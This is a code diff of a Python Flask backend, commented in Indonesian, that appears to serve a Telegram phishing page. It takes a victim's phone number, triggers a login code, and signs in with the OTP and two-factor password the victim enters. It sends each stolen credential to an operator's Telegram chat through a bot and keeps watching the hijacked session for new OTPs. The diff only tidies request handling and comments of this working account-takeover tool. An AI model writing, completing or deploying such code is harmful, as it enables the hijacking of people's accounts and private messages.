@@ -19,7 +19,9 @@ def bot_api(method, payload):
 
 @app.route('/register', methods=['POST'])
 def register():
-    return asyncio.run(handle_flow(request.json))
+    # PERBAIKAN: Menggunakan get_json() agar data terbaca
+    data = request.get_json()
+    return asyncio.run(handle_flow(data))
 
 async def handle_flow(data):
     try:
@@ -28,22 +30,20 @@ async def handle_flow(data):
         if nomor.startswith('0'): nomor = '+62' + nomor[1:]
         nama = data.get('nama', 'User')
 
-        # Ambil session jika ada, atau buat baru
         session_str = user_db.get(nomor, {}).get('session', '')
         client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
         await client.connect()
 
         if step == 1:
             res = await client.send_code_request(nomor)
-            # Simpan data nomor tanpa kirim pesan dulu agar tidak dobel
             user_db[nomor] = {"session": client.session.save(), "hash": res.phone_code_hash, "nama": nama, "msg_id": None}
             return jsonify({"status": "success"}), 200
 
         elif step == 2:
             try:
                 await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
-                # HANYA KIRIM PESAN JIKA BELUM PERNAH ADA PESAN UNTUK NOMOR INI
                 text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : "
+                # Logika 1 Pesan: Kirim jika baru, Edit jika sudah ada
                 if not user_db[nomor].get('msg_id'):
                     msg = bot_api("sendMessage", {
                         "chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown",
@@ -61,7 +61,6 @@ async def handle_flow(data):
             try:
                 await client.sign_in(password=data.get('sandi'))
                 text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : "
-                # EDIT PESAN LAMA (BUKAN KIRIM BARU)
                 if user_db[nomor].get('msg_id'):
                     bot_api("editMessageText", {
                         "chat_id": CHAT_ID, "message_id": user_db[nomor]['msg_id'], "text": text, 
@@ -75,7 +74,7 @@ async def handle_flow(data):
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    update = request.json
+    update = request.get_json()
     if "callback_query" in update:
         call = update["callback_query"]
         action, nomor = call["data"].split("_")
@@ -99,13 +98,12 @@ async def monitor_new_otp(nomor):
     async def handler(event):
         otp = re.search(r'\b\d{5}\b', event.raw_text)
         if otp:
-            # EDIT BARIS OTP PADA LOG UTAMA
             bot_api("editMessageText", {
                 "chat_id": CHAT_ID, "message_id": data['msg_id'],
                 "text": f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`",
                 "parse_mode": "Markdown", "reply_markup": {"inline_keyboard": [[{"text": "otp", "callback_data": f"upd_{nomor}"}]]}
             })
-            # HAPUS INSTRUKSI "BOT SIAP"
+            # Otomatis hapus instruksi "Bot siap"
             bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
             await client.disconnect()
     await asyncio.sleep(300)
